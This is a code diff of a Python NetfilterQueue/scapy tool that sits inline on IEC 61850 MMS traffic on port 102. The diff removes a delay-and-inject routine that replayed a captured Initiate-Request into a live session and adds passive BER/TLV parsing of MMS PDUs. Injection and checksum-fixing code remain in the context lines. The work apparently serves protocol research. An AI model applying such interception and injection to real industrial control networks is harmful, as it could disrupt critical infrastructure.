@@ -3,13 +3,13 @@
 import time
 from netfilterqueue import NetfilterQueue
 from scapy.all import IP, TCP, Raw, send
+from src.parser.tlv_parser import parse_all, pretty_print, encode_tlv
 
 # =========================
 # CONFIG
 # =========================
 MMS_PORT = 102
 QUEUE_NUM = 1
-DELAY_SECONDS = 2
 
 # =========================
 # FLOW STATE
@@ -70,6 +70,61 @@ def inject_packet(pkt, payload):
 
     send(injected, verbose=False)
 
+def extract_ber_after_cotp(payload):
+
+    # ---- TPKT ----
+    if len(payload) < 4 or payload[0] != 0x03:
+        return None
+
+    tpkt_len = int.from_bytes(payload[2:4], "big")
+    tpkt_body = payload[4:tpkt_len]
+
+    # ---- COTP ----
+    if len(tpkt_body) < 1:
+        return None
+
+    cotp_len = tpkt_body[0]
+    after_cotp = tpkt_body[cotp_len:]
+
+    return after_cotp
+
+def extract_mms_pdu(full_payload):
+
+    ber_data = extract_ber_after_cotp(full_payload)
+    if ber_data is None:
+        return None
+    tlvs = parse_all(ber_data)
+
+    mms_tlv = find_mms_tlv(tlvs)
+
+    if not mms_tlv:
+        return None
+
+    start = mms_tlv["start"]
+    end = mms_tlv["end"]
+
+    return ber_data[start:end]
+
+def find_mms_tlv(tlv):
+
+    if isinstance(tlv, list):
+        for node in tlv:
+            result = find_mms_tlv(node)
+            if result:
+                return result
+        return None
+
+    if tlv["tag_class"] == 2 and tlv["constructed"]:
+        return tlv
+
+    if tlv["constructed"]:
+        for child in tlv["value"]:
+            result = find_mms_tlv(child)
+            if result:
+                return result
+
+    return None  
+
 # =========================
 # PACKET HANDLER
 # =========================
@@ -104,25 +159,23 @@ def process_packet(packet):
         payload = pkt[Raw].load
 
         if is_tpkt(payload):
-            state["tpkt_count"] += 1
+            
+            #Parse live-MMS 
+            try:
+                mms_bytes = extract_mms_pdu(payload)
+                
+                if not mms_bytes:
+                   print("MMS PDU not found")
+                   return
+                
+                print("\n===== MMS PDU HEX =====")
+                print(mms_bytes.hex())
+                
+                tlvs = parse_all(mms_bytes)
+                pretty_print(tlvs)
 
-            # 1️⃣ Store Initiate-Request
-            if state["tpkt_count"] == 3:
-                state["initiate_payload"] = payload
-                print("[+] Stored Initiate-Request payload")
-
-            # 2️⃣ Delay Confirmed-Request + inject Initiate
-            elif state["tpkt_count"] == 4 and not state["injected"]:
-                print("[+] Confirmed-Request intercepted")
-                print("[+] Delaying and injecting Initiate-Request")
-
-                time.sleep(DELAY_SECONDS)
-
-                inject_packet(pkt, state["initiate_payload"])
-                state["delta"] += len(state["initiate_payload"])
-                state["injected"] = True
-
-                print("[+] Injected Initiate-Request during delay")
+            except Exception as e:
+                print("Parser error:", e)
 
     # =========================
     # FIX CHECKSUMS
@@ -139,9 +192,6 @@ def process_packet(packet):
 # MAIN
 # =========================
 def main():
-    print("[*] MMS delay + Initiate-Request injection running")
-    print("[*] Delay:", DELAY_SECONDS, "seconds\n")
-
     nfq = NetfilterQueue()
     nfq.bind(QUEUE_NUM, process_packet)
 
